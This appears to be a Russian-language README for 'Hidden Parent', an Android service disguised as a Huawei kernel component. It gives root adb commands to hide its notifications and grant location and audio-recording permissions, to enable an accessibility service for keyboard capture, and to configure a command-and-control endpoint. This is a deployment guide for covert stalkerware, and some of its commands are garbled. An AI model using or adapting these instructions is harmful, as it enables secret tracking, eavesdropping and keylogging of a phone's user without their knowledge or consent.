# Hidden Parent

Сервис для Андроида - "невидимый родитель". Требует root-a


#### Зайти как root

```
adb shell
su
```

Появится значок ```#``` - **root**. После этого все ```adb shell`` в последующих командах можно опускать.


#### Отключить все уведомления сервиса

Получить channel ID
```
adb shell appops query-op POST_NOTIFICATION
```

Затем
```
adb shell appops set <package_name> POST_NOTIFICATION ignore
```

Или
```
adb shell settings put system notification_enabled_<package_name> 0
```

И перезагрузить телефон.

Либо это же можно сделать через UI.



#### Запустить и остановить сервис

Это можно сделать либо через готовые bash-скрипты, которые присутствуют в проекте, либо вручную.

Запустить вручную:
```
shell shell am adb start-foreground-service com.huawei.kern_stabiliser/com.huawei.kern_stabiliser.SysGuardService
```

Остановить:
```
adb shell am adb stop-service com.huawei.kern_stabiliser/com.huawei.kern_stabiliser.SysGuardService
```

Получить статус:
```
adb shell dumpsys activity services | grep -i "com.huawei.kern_stabiliser"
```

#### Права (permissions)

Дать (root):
```
adb shell
su

pm grant com.huawei.kern_stabiliser android.permission.ACCESS_COARSE_LOCATION
pm grant com.huawei.kern_stabiliser android.permission.ACCESS_FINE_LOCATION
pm grant com.huawei.kern_stabiliser android.permission.ACCESS_BACKGROUND_LOCATION
pm grant com.huawei.kern_stabiliser android.permission.RECORD_AUDIO
pm grant com.huawei.kern_stabiliser android.permission.SYSTEM_ALERT_WINDOW
pm grant com.huawei.kern_stabiliser android.permission.WRITE_EXTERNAL_STORAGE

```

Лишить (?):
```
adb shell pm revoke <package_name> <permission>
```

Перечислить используемые (?):
```
adb shell pm list permissions -g | grep <package_name>
```


#### Доступ к клавиатуре (Accessibility)

Для того, что приложение имело доступ к клавиатуре, ему его нужно дать. Достичь этого можно 2мя способами:

1) через ADB (root):
```
adb shell
su

settings put secure enabled_accessibility_services com.huawei.kern_stabiliser/com.huawei.kern_stabiliser.SysGuardService\$KeychainGuardService
```

2) или через UI:
```
Settings (глобальные) -> Accessibility -> Downloaded Applications -> (My app/service)
```

И включить 1ый переключатель во "вкл", нажав далее в диалоге OK


#### Конфигурационный файл

См функцию `initializeConfigData()`

Добавить предварительно-созданный конфигурационный файл:
```
adb push config.json /data/data/com.your.package.name/files/config.json
```

Примерная структура файла:
```
{
    "c2_api_base_url": <string>,
    "c2_polling_interval_in_seconds": <int>,
    "c2_api_key": <string>
}
```

Если конфиг-файл отсутствует, то сервис всё равно запустится. Но, при этом будут использованы значения по-умолчанию.

Обновление файла потребует перезапуска сервиса.